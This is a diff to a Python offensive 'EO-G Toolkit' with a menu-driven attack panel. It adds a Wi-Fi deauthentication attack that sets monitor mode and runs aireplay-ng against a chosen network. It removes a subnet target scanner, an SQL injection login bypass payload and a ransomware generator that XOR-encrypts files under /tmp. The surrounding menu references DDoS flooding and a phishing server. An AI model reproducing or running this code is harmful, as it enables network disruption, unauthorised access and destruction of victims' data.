@@ -47,6 +47,62 @@ class EOGReal:
         except Exception as e:
             print(f"Recon error: {e}")
 
+    def wifi_attack(self):
+        """
+        Perform a Wi-Fi deauthentication attack.
+        """
+        print("Starting Wi-Fi attack...")
+        try:
+            # Detect Wi-Fi interface
+            print("Detecting wireless interfaces...")
+            result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True)
+            interfaces = [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line]
+
+            if not interfaces:
+                print("No wireless interfaces found! Ensure your wireless card supports monitor mode.")
+                return
+
+            print("\nAvailable Wireless Interfaces:")
+            for idx, iface in enumerate(interfaces, start=1):
+                print(f"{idx}. {iface}")
+            
+            iface_choice = int(input("Select your wireless interface (by number): "))
+            iface = interfaces[iface_choice - 1]
+
+            # Enable monitor mode
+            print(f"Enabling monitor mode on {iface}...")
+            subprocess.run(["ifconfig", iface, "down"])
+            subprocess.run(["iwconfig", iface, "mode", "monitor"])
+            subprocess.run(["ifconfig", iface, "up"])
+            print(f"Monitor mode enabled on {iface}.")
+
+            # Scan for Wi-Fi networks
+            print("Scanning for Wi-Fi networks...")
+            scan_result = subprocess.run(["iwlist", iface, "scan"], stdout=subprocess.PIPE, text=True)
+            networks = [
+                line.strip()
+                for line in scan_result.stdout.splitlines()
+                if "ESSID:" in line
+            ]
+            if not networks:
+                print("No networks found! Make sure your wireless card is within range.")
+                return
+
+            print("\nAvailable Networks:")
+            for idx, net in enumerate(networks, start=1):
+                ssid = net.split("ESSID:")[1].strip().replace('"', '')
+                print(f"{idx}. {ssid}")
+            
+            net_choice = int(input("Select a network to attack (by number): "))
+            target_ssid = networks[net_choice - 1].split("ESSID:")[1].strip().replace('"', '')
+
+            # Use aireplay-ng for deauthentication attack
+            print(f"Performing deauthentication attack on {target_ssid}...")
+            subprocess.run(["aireplay-ng", "--deauth", "0", "-e", target_ssid, "-c", iface])
+
+        except Exception as e:
+            print(f"Error during Wi-Fi attack: {e}")
+
     def ddos_attack(self, target_ip, duration=10):
         """
         Perform a UDP flood attack.
@@ -92,85 +148,6 @@ class EOGReal:
             print("\nPhishing server stopped.")
             server.server_close()
 
-    def detect_nearby_devices(self):
-        """
-        Detect nearby devices on the network.
-        """
-        print("Scanning for nearby devices...")
-        try:
-            local_ip = socket.gethostbyname(socket.gethostname())
-            subnet = ".".join(local_ip.split(".")[:-1]) + "."
-            print(f"Scanning subnet: {subnet}0/24")
-
-            devices = []
-            for i in range(1, 255):
-                ip = f"{subnet}{i}"
-                result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                if "1 packets transmitted, 1 received" in result.stdout.decode():
-                    devices.append(ip)
-
-            if not devices:
-                print("No devices found on the network.")
-                return None
-
-            print("\nNearby Devices:")
-            for index, device in enumerate(devices, start=1):
-                print(f"{index}. IP: {device}")
-
-            choice = int(input("Select a device to target (by number): "))
-            selected_device = devices[choice - 1]
-            print(f"Selected Device - IP: {selected_device}")
-            return selected_device
-        except Exception as e:
-            print(f"Error during device detection: {e}")
-            return None
-
-    def sql_injection_attack(self, target_url):
-        """
-        Perform a basic SQL injection attack.
-        """
-        print(f"Launching SQL injection attack on {target_url}")
-        try:
-            payload = {"username": "' OR 1=1 --", "password": "irrelevant"}
-            response = requests.post(target_url, data=payload)
-            if response.status_code == 200:
-                print("SQL injection succeeded!")
-                print("Response:", response.text)
-            else:
-                print("SQL injection failed.")
-        except Exception as e:
-            print(f"Error during SQL injection: {e}")
-
-    def generate_malware(self):
-        """
-        Generate simple ransomware malware.
-        """
-        print("Generating ransomware malware...")
-        ransomware_code = """
-import os
-
-key = 0x42
-
-def encrypt_file(file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            data = f.read()
-        encrypted_data = bytes([b ^ key for b in data])
-        with open(file_path, 'wb') as f:
-            f.write(encrypted_data)
-        print(f"Encrypted: {file_path}")
-    except Exception as e:
-        print(f"Error encrypting {file_path}: {e}")
-
-target_directory = "/tmp"
-for root, dirs, files in os.walk(target_directory):
-    for file in files:
-        encrypt_file(os.path.join(root, file))
-"""
-        with open("ransomware.py", "w") as f:
-            f.write(ransomware_code)
-        print("Ransomware script saved as 'ransomware.py'.")
-
 
 # EO-G Control Panel
 def eog_control():
@@ -180,10 +157,8 @@ def eog_control():
         print("1. Recon Target")
         print("2. DDoS Attack")
         print("3. Phishing Server")
-        print("4. Detect Nearby Devices")
-        print("5. SQL Injection Attack")
-        print("6. Generate Malware")
-        print("7. Exit")
+        print("4. Wi-Fi Attack")
+        print("5. Exit")
         choice = input("Choose an option: ")
 
         if choice == "1":
@@ -197,15 +172,8 @@ def eog_control():
             port = int(input("Enter the port for the phishing server: "))
             agent.phishing_page(port)
         elif choice == "4":
-            target_ip = agent.detect_nearby_devices()
-            if target_ip:
-                print(f"Targeting device: {target_ip}")
+            agent.wifi_attack()
         elif choice == "5":
-            target_url = input("Enter the target URL for SQL injection: ")
-            agent.sql_injection_attack(target_url)
-        elif choice == "6":
-            agent.generate_malware()
-        elif choice == "7":
             print("Exiting EO-G Toolkit.")
             break
         else:
